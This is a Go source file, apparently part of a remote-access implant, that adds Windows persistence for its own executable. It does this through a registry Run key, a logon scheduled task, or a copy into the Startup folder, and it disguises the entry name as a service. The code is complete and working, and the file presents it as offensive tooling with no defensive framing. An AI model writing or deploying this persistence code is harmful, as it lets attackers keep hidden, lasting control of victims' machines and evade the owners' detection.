//go:build windows

package commands

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// Persist 在 Windows 上植入持久化。technique 格式: "方法 [名称]"，
// 方法支持 registry|schtasks|startup。名称默认伪装修饰前缀。
//   registry: HKCU\...\Run 键（用户级，无需管理员）
//   schtasks: 计划任务 /sc onlogon
//   startup:  拷贝到启动文件夹
func Persist(technique string) ([]byte, error) {
	exe, err := os.Executable()
	if err != nil {
		return nil, err
	}
	parts := strings.Fields(technique)
	method := ""
	name := masquerade("Svc")
	if len(parts) > 0 {
		method = parts[0]
	}
	if len(parts) > 1 {
		name = parts[1]
	}

	switch method {
	case "registry":
		cmd := exec.Command("reg", "add",
			`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
			"/v", name, "/t", "REG_SZ", "/d", exe, "/f")
		if out, err := cmd.CombinedOutput(); err != nil {
			return nil, fmt.Errorf("registry persist 失败: %v: %s", err, out)
		}
		return []byte(fmt.Sprintf("✅ registry 持久化成功: HKCU\\...\\Run\\%s = %s", name, exe)), nil
	case "schtasks":
		cmd := exec.Command("schtasks", "/create", "/tn", name, "/tr", exe, "/sc", "onlogon", "/f")
		if out, err := cmd.CombinedOutput(); err != nil {
			return nil, fmt.Errorf("schtasks persist 失败: %v: %s", err, out)
		}
		return []byte(fmt.Sprintf("✅ schtasks 持久化成功: %s -> %s", name, exe)), nil
	case "startup":
		startupDir := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
		dst := filepath.Join(startupDir, name+".exe")
		if err := persistCopyFile(exe, dst); err != nil {
			return nil, fmt.Errorf("startup persist 失败: %v", err)
		}
		return []byte(fmt.Sprintf("✅ startup 持久化成功: %s", dst)), nil
	default:
		return nil, fmt.Errorf("不支持的 Windows 持久化方法: %s（可用 registry|schtasks|startup）", method)
	}
}

func persistCopyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()
	if _, err := io.Copy(out, in); err != nil {
		return err
	}
	return nil
}
